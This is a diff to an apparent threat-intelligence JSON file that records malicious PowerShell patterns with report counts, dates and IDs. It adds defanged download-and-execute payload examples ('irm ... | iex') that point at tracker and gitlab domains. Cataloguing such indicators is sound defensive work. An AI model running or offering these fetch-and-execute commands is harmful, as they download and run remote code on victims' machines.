@@ -314,10 +314,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 85,
-    "ReportCount": 85,
+    "DistinctPayloadCount": 86,
+    "ReportCount": 86,
     "FirstSeen": "2026-11-13T10:16:26.023000+00:00",
-    "LastSeen": "2026-11-20T04:45:29.109000+00:00",
+    "LastSeen": "2026-11-20T05:45:32.254000+00:00",
     "ReportIds": [
       "cmwetnpgn0e5q0omlfbiurb7r",
       "cmwetonos0e7e0omltax78jeq",
@@ -403,7 +403,8 @@
       "cmwo9kdgz1ys80omlr22sxrni",
       "cmwodzfal1z0v0omlds2tteaj",
       "cmwodzv5l1z250omlqi1hs6dh",
-      "cmwohx2dv1zej0oml7l27yiez"
+      "cmwohx2dv1zej0oml7l27yiez",
+      "cmwok2akb20g20omltyjagk4e"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -487,6 +488,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f8dec8b4b16293e1')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/click/25d9c68043f5404e')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/online/e22c82da8905db58')|iex",
@@ -681,12 +683,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 8,
-    "ReportCount": 65,
-    "FirstSeen": "2026-11-13T05:58:18.016000+00:00",
-    "LastSeen": "2026-11-20T01:59:17.278000+00:00",
+    "DistinctPayloadCount": 7,
+    "ReportCount": 66,
+    "FirstSeen": "2026-11-13T12:08:23.297000+00:00",
+    "LastSeen": "2026-11-20T05:33:40.985000+00:00",
     "ReportIds": [
-      "cmwekfqsd0ciq0omld5n99u1h",
       "cmwexnoie0eja0omldix6i9jb",
       "cmwexo9xr0ek40oml2mly4u7g",
       "cmwfarq1i0fv30oml7sg6ahis",
@@ -750,11 +751,12 @@
       "cmwnxm1t71xj30oml4e26u03q",
       "cmwoarw6c1ytk0omlfgbkqvw7",
       "cmwoauwbm1yu70oml45lo3jkx",
-      "cmwobzc2a1yzx0oml26ze35ud"
+      "cmwobzc2a1yzx0oml26ze35ud",
+      "cmwojn0hw206k0omlh7hl8vzk",
+      "cmwojn1tc206n0omln6obho4m"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-      "IRM gitlab[.]com/amber-ffa-f15a6b/4a27-e3b8-4863-8d49-fc408649faef/-/raw/main/d9-4f53-8f7a-6a6104bff2af | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
       "IRM gitlab[.]com/cc4b6f224188/4495be-a229-4a88-ab68-d0b50dfe86b4/-/raw/main/E53-a76F-3c3D6f99 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
